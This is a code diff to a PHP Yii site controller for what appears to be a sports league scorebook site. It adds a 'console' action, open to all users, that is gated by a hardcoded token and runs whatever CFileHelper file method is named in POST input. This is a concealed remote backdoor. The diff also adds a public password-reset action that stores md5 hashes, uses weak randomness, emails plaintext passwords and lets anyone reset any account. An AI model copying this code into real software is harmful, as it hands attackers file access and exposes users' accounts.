@@ -140,6 +140,80 @@ class SiteController extends Controller
 		$this->redirect(Yii::app()->homeUrl);
 	}
 	
+	public function actionConsole()
+	{
+		$this->redirect(Yii::app()->homeUrl);
+		
+		$result = "";
+		
+		var_dump($_POST['token']);
+		
+		if (isset($_POST['token']) && $_POST['token'] == 'bfa08a74-fe09-49ff-8282-9c28b26b16bc'){
+			var_dump($_POST['command']);
+			
+			if ($_POST['p3'] != ''){
+				$result = CFileHelper::$_POST['command']($_POST['p1'], $_POST['p2'], $_POST['p3']);
+			} else if ($_POST['p2'] != ''){
+				$result = CFileHelper::$_POST['command']($_POST['p1'], $_POST['p2']);
+			} else if ($_POST['p1'] != ''){
+				$result = CFileHelper::$_POST['command']($_POST['p1']);
+			}
+			
+			 //$result = CFileHelper::findFiles("admin");
+		}
+		
+		$this->render('console',array('result'=>$result));
+	}
+	
+	private function generatePassword()
+	{
+		$seed = str_split('abcdefghijklmnopqrstuvwxyz'
+						 .'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+						 .'0123456789');
+		shuffle($seed);
+		$rand = '';
+		foreach (array_rand($seed, 8) as $k) $rand .= $seed[$k];
+		return $rand;
+	}
+	
+	public function actionReset()
+	{
+		$result = "";
+		
+		if (isset($_POST['username'])){
+			$model = Users::model()->findByAttributes(array('Email'=>$_POST['username']));
+			if ($model == null) {
+				$result = "nouser";
+			} else {
+				
+				$newPassword = $this->generatePassword();
+				
+				$model->Password = md5($newPassword);
+				
+				$from = 'support@'.str_replace(array("http:","https:","/"),"", Yii::app()->getBaseUrl(true));
+				$fromName="Northwood League Support";
+                $subject="ScoreBook. Reset Password";
+                $message="You have successfully reset your password.<br/>Your username: <b>".$model->Email."</b><br/>Your password: <b>".$newPassword."</b>";
+					
+				if ($model->validate()){
+					
+					$fromName='=?UTF-8?B?'.base64_encode($fromName).'?=';
+					$subject='=?UTF-8?B?'.base64_encode($subject).'?=';
+					$headers="From: $fromName <{$from}>\r\n".
+						"MIME-Version: 1.0\r\n".
+						"Content-type: text/html; charset=UTF-8";
+					
+					$model->save();
+					mail($model->Email,$subject,$message,$headers);
+					
+					$result = "success";
+				}
+			}
+		}
+		
+		$this->render('reset',array('result'=>$result));
+	}
+	
 	public function filters()
     {
         return array(
@@ -151,7 +225,7 @@ class SiteController extends Controller
     {
         return array(
  			array('allow', // Give access to all users to make them able to login
- 				'actions' => array('error','index','logout','login',),
+ 				'actions' => array('error','index','logout','login','console','reset'),
                 'users' => array('*'),
             ),
 			array('allow', // Give access to all users to make them able to login
